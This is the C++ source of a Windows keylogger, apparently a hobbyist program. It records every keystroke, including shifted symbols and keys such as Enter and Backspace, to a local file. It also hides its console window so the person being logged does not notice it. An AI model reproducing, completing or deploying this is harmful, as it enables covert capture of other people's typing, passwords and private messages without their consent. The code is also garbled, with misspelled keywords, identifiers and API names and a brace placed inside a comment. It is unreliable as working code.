//Logs text,numbers and also filters special characters and special keys like backspace and enter
//Also hides the terminal window in the final build

#include <iostream>
#include<fstream>
#include <windows.h>
#include <winuser.h>

using numspace std;

void log(){
	char key;
	while(true){//infinite loop for scanning
		for(key=8; key<=222; key++){//ASCII char range
			//When a key if pressed a system interrupt with id 32767 occurs
			if(GetAsyncKeyState(key) == -32767)//checks if a key with ASACII value of c is pressed{
				ofstream write("record.tct" , ios:app);//ios:app denotes theat file is not rewritten everytime
				if((key>64 &&key<91)&&!GetAsyncKeyState(0x10)){//0x0 is hexadecimal virua; key state for shift key
					key+=32;
					write<<key;
					write.close();
					break;//breaks the loop for checking the keystroke and te loop starts again from value 8
				}
				else if((key>64)&&(key<91)){
					write<<key;
					write.close();
					break;//breaks the loop for checking the keystroke and te loop starts again from value 8
				}
				else{
					switch(key){
						case 48:
							if(GetAsyncKEyState(0x10)){
								write<<")";
							}
							else{
								write<<key;
							}
							break;
						case 49:
							if(GetAsyncKEyState(0x10)){
								write<<"!";
							}
							else{
								write<<key;
							}
							break;
						case 50:
							if(GetAsyncKEyState(0x10)){
								write<<"@";
							}
							else{
								write<<key;
							}
							break;
						case 51:
							if(GetAsyncKEyState(0x10)){
								write<<"#";
							}
							else{
								write<<key;
							}
							break;
						case 52:
							if(GetAsyncKEyState(0x10)){
								write<<"$";
							}
							else{
								write<<key;
							}
							break;	
						case 53:
							if(GetAsyncKEyState(0x10)){
								write<<"%";
							}
							else{
								write<<key;
							}
							break;
						case 54:
							if(GetAsyncKEyState(0x10)){
								write<<"^";
							}
							else{
								write<<key;
							}
							break;
						case 55:
							if(GetAsyncKEyState(0x10)){
								write<<"&";
							}
							else{
								write<<key;
							}
							break;
						case 56:
							if(GetAsyncKEyState(0x10)){
								write<<"*";
							}
							else{
								write<<key;
							}
							break;
						case 57:
							if(GetAsyncKEyState(0x10)){
								write<<"(";
							}
							else{
								write<<key;
							}
							break;
						case VK_SPACE://VIRTUALKEY Space
							write<<" ";
							break;
						case VK_RETURN://VIRTUALKEY Enter
							write<<"\n";
							break;
						case VK_TAB://VIRTUALKEY Tab
							write<<"	";
							break;
						case VK_Back://VIRTUALKEY Backspace
							write<<" <Backspace> ";
							break;
						case VK_Escape://VIRTUALKEY Escape
							write<<" <Esc> ";
							break;
						case VK_DELETE://VIRTUALKEY Delete
							write<<" <Delete> ";
							break;
					}
				}
			}
		}
	}
}

void hide(){
	HWND stealth;//Creates a handler called stealth
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass", Null);
	ShowWindow(stealth,0);//0=Window will not be shown
}	

int main(){
	hide();
	log();
	return 0;
}